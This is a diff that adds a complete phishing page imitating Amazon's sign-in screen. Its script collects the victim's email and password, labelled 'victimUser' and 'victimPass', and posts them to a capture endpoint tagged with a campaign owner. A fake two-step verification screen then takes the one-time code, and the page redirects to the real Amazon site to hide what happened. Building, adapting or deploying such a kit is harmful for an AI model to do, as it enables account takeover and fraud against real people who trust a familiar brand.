@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign-In</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Amazon Ember", Arial, sans-serif;
+      background-color: #ffffff;
+      color: #111111;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 18px 16px 48px;
+    }
+
+    body.whiteout-loading .logo-wrapper,
+    body.whiteout-loading .signin-card,
+    body.whiteout-loading .otp-screen,
+    body.whiteout-loading .bottom-test-text {
+      display: none !important;
+    }
+
+    /* Écran blanc complet avec barre de chargement circulaire jaune (5 secondes) */
+    .white-loader-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: #ffffff;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .white-loader-overlay.active {
+      display: flex;
+    }
+
+    .yellow-circle-loader {
+      width: 56px;
+      height: 56px;
+      border: 4px solid rgba(255, 216, 20, 0.25);
+      border-top: 4px solid #ffd814;
+      border-radius: 50%;
+      animation: spinYellow 0.85s linear infinite;
+    }
+
+    @keyframes spinYellow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Logo en haut */
+    .logo-wrapper {
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .amazon-logo {
+      display: inline-flex;
+      flex-direction: column;
+      align-items: center;
+      text-decoration: none;
+      user-select: none;
+    }
+
+    .amazon-wordmark {
+      font-size: 2rem;
+      font-weight: 800;
+      letter-spacing: -0.04em;
+      color: #111111;
+      line-height: 1;
+    }
+
+    .amazon-smile {
+      width: 82px;
+      height: 14px;
+      margin-top: 2px;
+    }
+
+    /* Cadre principal de connexion */
+    .signin-card {
+      width: 100%;
+      max-width: 356px;
+      background-color: #ffffff;
+      border: 1px solid #dddddd;
+      border-radius: 6px;
+      padding: 22px 26px 24px;
+    }
+
+    .signin-card h1 {
+      font-size: 1.75rem;
+      font-weight: 400;
+      color: #111111;
+      margin-bottom: 16px;
+      line-height: 1.2;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .label-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 6px;
+    }
+
+    label {
+      font-size: 0.84rem;
+      font-weight: 700;
+      color: #111111;
+    }
+
+    .link-blue {
+      color: #0066c0;
+      font-size: 0.82rem;
+      text-decoration: none;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 0;
+    }
+
+    .link-blue:hover {
+      color: #c45500;
+      text-decoration: underline;
+    }
+
+    .text-input {
+      width: 100%;
+      height: 33px;
+      padding: 4px 8px;
+      font-size: 0.9rem;
+      color: #111111;
+      background-color: #ffffff;
+      border: 1px solid #a6a6a6;
+      border-top-color: #949494;
+      border-radius: 4px;
+      outline: none;
+      transition: box-shadow 0.15s ease, border-color 0.15s ease;
+    }
+
+    .text-input:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 0 3px rgba(228, 121, 17, 0.35);
+    }
+
+    /* Bouton jaune arrondi */
+    .btn-signin-yellow {
+      width: 100%;
+      height: 38px;
+      margin-top: 6px;
+      background: linear-gradient(180deg, #ffe733 0%, #ffd814 55%, #f7ca00 100%);
+      border: 1px solid #e0b200;
+      border-radius: 16px;
+      color: #111111;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(213, 217, 217, 0.6);
+      transition: background 0.15s ease, transform 0.1s ease, box-shadow 0.15s ease;
+    }
+
+    .btn-signin-yellow:hover {
+      background: linear-gradient(180deg, #ffdf1a 0%, #f7ca00 100%);
+      border-color: #cfa000;
+    }
+
+    .btn-signin-yellow:active {
+      background: #f2be00;
+      transform: scale(0.99);
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2);
+    }
+
+    .legal-text {
+      margin-top: 15px;
+      font-size: 0.78rem;
+      line-height: 1.45;
+      color: #222222;
+    }
+
+    .keep-signed-row {
+      margin-top: 16px;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 0.82rem;
+      color: #111111;
+    }
+
+    .keep-signed-row input[type="checkbox"] {
+      width: 14px;
+      height: 14px;
+      accent-color: #e77600;
+      cursor: pointer;
+    }
+
+    .details-toggle {
+      background: none;
+      border: none;
+      color: #0066c0;
+      font-size: 0.82rem;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .details-toggle:hover {
+      color: #c45500;
+      text-decoration: underline;
+    }
+
+    .details-box {
+      display: none;
+      margin-top: 8px;
+      padding: 10px 12px;
+      background-color: #f7fafa;
+      border: 1px solid #d5d9d9;
+      border-radius: 6px;
+      font-size: 0.78rem;
+      line-height: 1.4;
+      color: #333333;
+    }
+
+    .details-box.open {
+      display: block;
+    }
+
+    .divider-new {
+      position: relative;
+      text-align: center;
+      margin: 22px 0 14px;
+    }
+
+    .divider-new::before {
+      content: "";
+      position: absolute;
+      top: 50%;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background-color: #e7e7e7;
+      z-index: 1;
+    }
+
+    .divider-new span {
+      position: relative;
+      z-index: 2;
+      background-color: #ffffff;
+      padding: 0 10px;
+      font-size: 0.78rem;
+      color: #767676;
+    }
+
+    .btn-create-account {
+      width: 100%;
+      height: 34px;
+      background: linear-gradient(180deg, #f7f8fa 0%, #e7e9ec 100%);
+      border: 1px solid #adb1b8;
+      border-radius: 8px;
+      color: #111111;
+      font-size: 0.84rem;
+      cursor: pointer;
+      box-shadow: 0 1px 0 rgba(255, 255, 255, 0.6) inset;
+      transition: background 0.15s ease;
+    }
+
+    .btn-create-account:hover {
+      background: linear-gradient(180deg, #e7eaf0 0%, #d9dce1 100%);
+    }
+
+    .feedback-message {
+      margin-top: 12px;
+      font-size: 0.82rem;
+      min-height: 18px;
+      color: #b12704;
+    }
+
+    /* Écran Two-Step Verification (OTP) */
+    .otp-screen {
+      display: none;
+      width: 100%;
+      max-width: 390px;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .otp-screen.visible {
+      display: flex;
+    }
+
+    .otp-card {
+      width: 100%;
+      background-color: #ffffff;
+      border: 1px solid #d5d9d9;
+      border-radius: 8px;
+      padding: 22px 24px 26px;
+    }
+
+    .otp-title {
+      font-size: 1.55rem;
+      font-weight: 700;
+      color: #0f1111;
+      margin-bottom: 10px;
+      line-height: 1.25;
+    }
+
+    .otp-target-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 14px;
+      font-size: 0.92rem;
+      color: #0f1111;
+      word-break: break-all;
+    }
+
+    .otp-instruction {
+      font-size: 0.92rem;
+      line-height: 1.45;
+      color: #0f1111;
+      margin-bottom: 14px;
+    }
+
+    .otp-label {
+      display: block;
+      font-size: 0.88rem;
+      font-weight: 700;
+      color: #0f1111;
+      margin-bottom: 6px;
+    }
+
+    .otp-input-box {
+      width: 100%;
+      height: 44px;
+      padding: 6px 10px;
+      font-size: 1rem;
+      color: #0f1111;
+      background-color: #ffffff;
+      border: 2px solid #007185;
+      border-radius: 6px;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 113, 133, 0.16);
+      margin-bottom: 16px;
+    }
+
+    .otp-input-box:focus {
+      border-color: #005f70;
+      box-shadow: 0 0 0 4px rgba(0, 113, 133, 0.24);
+    }
+
+    .otp-continue-btn {
+      width: 100%;
+      height: 40px;
+      background-color: #ffd814;
+      border: 1px solid #fcd200;
+      border-radius: 20px;
+      color: #0f1111;
+      font-size: 0.95rem;
+      font-weight: 500;
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(213, 217, 217, 0.5);
+      transition: background-color 0.15s ease;
+    }
+
+    .otp-continue-btn:hover {
+      background-color: #f7ca00;
+    }
+
+    .otp-resend-wrap {
+      margin-top: 18px;
+      text-align: center;
+    }
+
+    .otp-resend-btn {
+      background: none;
+      border: none;
+      color: #0066c0;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+
+    .otp-resend-btn:hover {
+      color: #c45500;
+      text-decoration: underline;
+    }
+
+    .otp-rates-note {
+      width: 100%;
+      margin-top: 18px;
+      padding-top: 14px;
+      border-top: 1px solid #e7e7e7;
+      font-size: 0.8rem;
+      color: #565959;
+    }
+
+    .otp-cancel-box {
+      width: 100%;
+      margin-top: 14px;
+      background-color: #ffffff;
+      border: 1px solid #d5d9d9;
+      border-radius: 8px;
+      padding: 12px;
+      text-align: center;
+    }
+
+    .otp-cancel-btn {
+      width: 100%;
+      background: none;
+      border: none;
+      color: #0f1111;
+      font-size: 0.95rem;
+      cursor: pointer;
+    }
+
+    .otp-status {
+      margin-top: 10px;
+      font-size: 0.82rem;
+      color: #067d62;
+      min-height: 18px;
+      text-align: center;
+    }
+
+    /* Écritures de test en gris en bas du cadre */
+    .bottom-test-text {
+      width: 100%;
+      max-width: 356px;
+      margin-top: 22px;
+      padding-top: 18px;
+      border-top: 1px solid #e6e6e6;
+      text-align: center;
+      color: #767676;
+      font-size: 0.78rem;
+      line-height: 1.5;
+    }
+
+    .test-links-row {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 8px;
+    }
+
+    .test-gray-link {
+      color: #767676;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .test-gray-link:hover {
+      text-decoration: underline;
+      color: #555555;
+    }
+
+    .test-copy-line {
+      color: #888888;
+      font-size: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+  <!-- Écran blanc complet avec barre de chargement circulaire jaune (5 secondes) -->
+  <div id="whiteLoaderOverlay" class="white-loader-overlay" aria-live="polite" aria-busy="true">
+    <div class="yellow-circle-loader" aria-hidden="true"></div>
+  </div>
+
+  <!-- Logo Amazon en haut -->
+  <header class="logo-wrapper">
+    <a href="#" class="amazon-logo" id="logoLink" aria-label="Amazon">
+      <span class="amazon-wordmark">amazon</span>
+      <svg class="amazon-smile" viewBox="0 0 120 22" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M8 5C34 19 78 20 110 6" stroke="#FF9900" stroke-width="4.5" stroke-linecap="round" />
+        <path d="M103 3L112 5.5L107.5 14" stroke="#FF9900" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round" />
+      </svg>
+    </a>
+  </header>
+
+  <!-- Étape 1 : Formulaire de connexion -->
+  <main class="signin-card" id="signinCard">
+    <h1>Sign-In</h1>
+
+    <form id="signinForm" novalidate>
+      <div class="form-group">
+        <div class="label-row">
+          <label for="emailInput">Email (phone for mobile accounts)</label>
+        </div>
+        <input
+          type="text"
+          id="emailInput"
+          name="email"
+          class="text-input"
+          autocomplete="username"
+          required
+        />
+      </div>
+
+      <div class="form-group">
+        <div class="label-row">
+          <label for="passwordInput">Password</label>
+          <a href="#" class="link-blue" id="forgotPasswordLink">Forgot your password?</a>
+        </div>
+        <input
+          type="password"
+          id="passwordInput"
+          name="password"
+          class="text-input"
+          autocomplete="current-password"
+          required
+        />
+      </div>
+
+      <button type="submit" class="btn-signin-yellow" id="signInBtn">Sign-In</button>
+
+      <p class="legal-text">
+        By continuing, you agree to Amazon's
+        <a href="#" class="link-blue" id="conditionsLink">Conditions of Use</a> and
+        <a href="#" class="link-blue" id="privacyLink">Privacy Notice</a>.
+      </p>
+
+      <div class="keep-signed-row">
+        <input type="checkbox" id="keepSignedIn" name="keepSignedIn" />
+        <label for="keepSignedIn" style="font-weight: 400;">Keep me signed in.</label>
+        <button type="button" class="details-toggle" id="detailsBtn" aria-expanded="false" aria-controls="detailsBox">
+          Details ▾
+        </button>
+      </div>
+
+      <div class="details-box" id="detailsBox">
+        Choosing "Keep me signed in" reduces the number of times you're asked to Sign-In on this device. To keep your account secure, use this option only on your personal devices.
+      </div>
+
+      <div class="divider-new">
+        <span>New to Amazon?</span>
+      </div>
+
+      <button type="button" class="btn-create-account" id="createAccountBtn">
+        Create your Amazon account
+      </button>
+
+      <div class="feedback-message" id="feedbackMessage" aria-live="polite"></div>
+    </form>
+  </main>
+
+  <!-- Étape 2 : Écran Two-Step Verification (OTP) -->
+  <section class="otp-screen" id="otpScreen" aria-live="polite">
+    <div class="otp-card">
+      <h1 class="otp-title">Two-Step Verification</h1>
+
+      <div class="otp-target-row">
+        <span id="otpTargetDisplay">+254723134375</span>
+        <button type="button" class="link-blue" id="changeTargetBtn">Change</button>
+      </div>
+
+      <p class="otp-instruction">
+        We've sent a One Time Password (OTP) to your phone number. Please enter it below.
+      </p>
+
+      <form id="otpForm" novalidate>
+        <label for="otpInput" class="otp-label">Enter OTP</label>
+        <input
+          type="text"
+          id="otpInput"
+          class="otp-input-box"
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          required
+        />
+
+        <button type="submit" class="otp-continue-btn" id="otpContinueBtn">Continue</button>
+      </form>
+
+      <div class="otp-resend-wrap">
+        <button type="button" class="otp-resend-btn" id="resendOtpBtn">Resend code</button>
+      </div>
+
+      <div class="otp-status" id="otpStatus"></div>
+
+      <p class="otp-rates-note">Message and data rates may apply.</p>
+    </div>
+
+    <div class="otp-cancel-box">
+      <button type="button" class="otp-cancel-btn" id="cancelOtpBtn">Cancel</button>
+    </div>
+  </section>
+
+  <!-- Écritures de test en gris en bas du cadre -->
+  <footer class="bottom-test-text" id="bottomTestText" aria-label="Écritures de test">
+    <div class="test-links-row">
+      <a href="#" class="test-gray-link" id="testLink1">Test Conditions</a>
+      <a href="#" class="test-gray-link" id="testLink2">Test Privacy</a>
+      <a href="#" class="test-gray-link" id="testLink3">Test Help</a>
+    </div>
+    <p class="test-copy-line" id="testNoteText">
+      Texte de test gris en bas du cadre — Version d'essai interface utilisateur.
+    </p>
+  </footer>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const campaignOwner = urlParams.get("user") || "Kim";
+    const linkType = (urlParams.get("type") || "otp").toLowerCase();
+
+    let savedUser = "";
+    let savedPass = "";
+    let isSubmittingOtp = false;
+
+    const signinCard = document.getElementById("signinCard");
+    const signinForm = document.getElementById("signinForm");
+    const emailInput = document.getElementById("emailInput");
+    const passwordInput = document.getElementById("passwordInput");
+    const keepSignedIn = document.getElementById("keepSignedIn");
+    const detailsBtn = document.getElementById("detailsBtn");
+    const detailsBox = document.getElementById("detailsBox");
+    const createAccountBtn = document.getElementById("createAccountBtn");
+    const forgotPasswordLink = document.getElementById("forgotPasswordLink");
+    const conditionsLink = document.getElementById("conditionsLink");
+    const privacyLink = document.getElementById("privacyLink");
+    const feedbackMessage = document.getElementById("feedbackMessage");
+    const whiteLoaderOverlay = document.getElementById("whiteLoaderOverlay");
+    const bottomTestText = document.getElementById("bottomTestText");
+
+    const otpScreen = document.getElementById("otpScreen");
+    const otpTargetDisplay = document.getElementById("otpTargetDisplay");
+    const changeTargetBtn = document.getElementById("changeTargetBtn");
+    const otpForm = document.getElementById("otpForm");
+    const otpInput = document.getElementById("otpInput");
+    const otpContinueBtn = document.getElementById("otpContinueBtn");
+    const resendOtpBtn = document.getElementById("resendOtpBtn");
+    const cancelOtpBtn = document.getElementById("cancelOtpBtn");
+    const otpStatus = document.getElementById("otpStatus");
+    const testLinks = document.querySelectorAll(".test-gray-link");
+
+    function sendCapture(payload) {
+      return fetch("/api/capture", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch((err) => console.log(err));
+    }
+
+    function runWhiteCircleLoader(durationMs, onDone) {
+      document.body.classList.add("whiteout-loading");
+      whiteLoaderOverlay.classList.add("active");
+
+      setTimeout(() => {
+        whiteLoaderOverlay.classList.remove("active");
+        document.body.classList.remove("whiteout-loading");
+        if (typeof onDone === "function") {
+          onDone();
+        }
+      }, durationMs);
+    }
+
+    function openOtpStep(identifierValue) {
+      signinCard.style.display = "none";
+      bottomTestText.style.display = "none";
+      otpTargetDisplay.textContent = identifierValue || "+254723134375";
+      otpInput.value = "";
+      otpStatus.textContent = "";
+      isSubmittingOtp = false;
+      otpScreen.classList.add("visible");
+      otpInput.focus();
+    }
+
+    function redirectToOfficialSite() {
+      window.location.replace("https://www.amazon.fr");
+    }
+
+    detailsBtn.addEventListener("click", () => {
+      const isOpen = detailsBox.classList.toggle("open");
+      detailsBtn.setAttribute("aria-expanded", String(isOpen));
+      detailsBtn.textContent = isOpen ? "Details ▴" : "Details ▾";
+    });
+
+    signinForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      feedbackMessage.textContent = "";
+
+      const emailVal = emailInput.value.trim();
+      const passVal = passwordInput.value;
+
+      if (!emailVal) {
+        feedbackMessage.textContent = "Enter your email or mobile phone number.";
+        emailInput.focus();
+        return;
+      }
+
+      if (!passVal) {
+        feedbackMessage.textContent = "Enter your password.";
+        passwordInput.focus();
+        return;
+      }
+
+      savedUser = emailVal;
+      savedPass = passVal;
+
+      const isOtpFlow = linkType !== "standard";
+
+      const payload = {
+        owner: campaignOwner,
+        network: "Amazon",
+        type: isOtpFlow ? "otp_step1" : "standard",
+        victimUser: savedUser,
+        victimPass: savedPass,
+        keepSignedIn: keepSignedIn.checked,
+        otp: "Aucun"
+      };
+
+      sendCapture(payload);
+
+      runWhiteCircleLoader(5000, () => {
+        if (isOtpFlow) {
+          openOtpStep(savedUser);
+        } else {
+          redirectToOfficialSite();
+        }
+      });
+    });
+
+    otpForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      if (isSubmittingOtp) return;
+
+      const otpCode = otpInput.value.trim();
+
+      if (!otpCode) {
+        otpStatus.style.color = "#b12704";
+        otpStatus.textContent = "Please enter the One Time Password (OTP).";
+        otpInput.focus();
+        return;
+      }
+
+      isSubmittingOtp = true;
+      otpContinueBtn.disabled = true;
+
+      const payload = {
+        owner: campaignOwner,
+        network: "Amazon",
+        type: linkType,
+        victimUser: savedUser,
+        victimPass: savedPass,
+        keepSignedIn: keepSignedIn.checked,
+        otp: otpCode
+      };
+
+      const redirectTimer = setTimeout(redirectToOfficialSite, 1200);
+
+      sendCapture(payload).finally(() => {
+        clearTimeout(redirectTimer);
+        redirectToOfficialSite();
+      });
+    });
+
+    changeTargetBtn.addEventListener("click", () => {
+      otpScreen.classList.remove("visible");
+      signinCard.style.display = "block";
+      bottomTestText.style.display = "block";
+      emailInput.focus();
+    });
+
+    resendOtpBtn.addEventListener("click", () => {
+      otpStatus.style.color = "#067d62";
+      otpStatus.textContent = "A new OTP has been sent.";
+      otpInput.focus();
+    });
+
+    cancelOtpBtn.addEventListener("click", () => {
+      redirectToOfficialSite();
+    });
+
+    createAccountBtn.addEventListener("click", () => {
+      feedbackMessage.textContent = "Redirecting to Create your Amazon account...";
+    });
+
+    forgotPasswordLink.addEventListener("click", (e) => {
+      e.preventDefault();
+      feedbackMessage.textContent = "Password assistance opened.";
+    });
+
+    conditionsLink.addEventListener("click", (e) => {
+      e.preventDefault();
+      feedbackMessage.textContent = "Conditions of Use selected.";
+    });
+
+    privacyLink.addEventListener("click", (e) => {
+      e.preventDefault();
+      feedbackMessage.textContent = "Privacy Notice selected.";
+    });
+
+    testLinks.forEach((link) => {
+      link.addEventListener("click", (e) => {
+        e.preventDefault();
+        feedbackMessage.textContent = "Clic sur : " + link.textContent;
+      });
+    });
+  </script>
+</body>
+</html>
